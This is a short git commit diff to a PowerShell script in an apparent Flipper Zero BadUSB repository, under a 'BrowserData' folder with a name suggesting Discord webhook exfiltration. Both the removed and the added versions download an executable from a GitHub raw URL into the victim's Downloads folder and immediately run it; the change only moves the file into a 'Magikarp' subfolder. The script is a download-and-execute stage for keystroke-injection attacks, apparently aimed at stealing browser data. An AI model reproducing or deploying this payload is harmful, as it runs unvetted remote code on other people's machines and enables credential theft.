13ce93ea5020e6aa745b4abf5c6d53d7ab5a8a96
Chris <christophe.da.cruz.tic@gmail.com>
2023-12-26 16:50:09 +0100

    The fix was already fonctionning, pb by some cache on Windows Powershell

--- badusb/BrowserData/discord_wh_windows.ps1
+++ badusb/BrowserData/discord_wh_windows.ps1
@@ -1,4 +1,11 @@
 $url="https://raw.githubusercontent.com/MagikarpLv13/flipper-zero/main/badusb/BrowserData/External/windows64.exe"
-$destination=[System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'windows64.exe')
-Invoke-WebRequest -Uri $url -OutFile $destination
-Start-Process -FilePath $destination -Wait
+
+$dl=[System.IO.Path]::Combine($env:UserProfile, 'Downloads', 'Magikarp')
+
+if (-not (Test-Path $dl -PathType Container)) {
+    New-Item -ItemType Directory -Path $dl | Out-Null
+}
+
+$dl_win64=[System.IO.Path]::Combine($dl, 'windows64.exe')
+Invoke-WebRequest -Uri $url -OutFile $dl_win64
+Start-Process -FilePath $dl_win64 -Wait
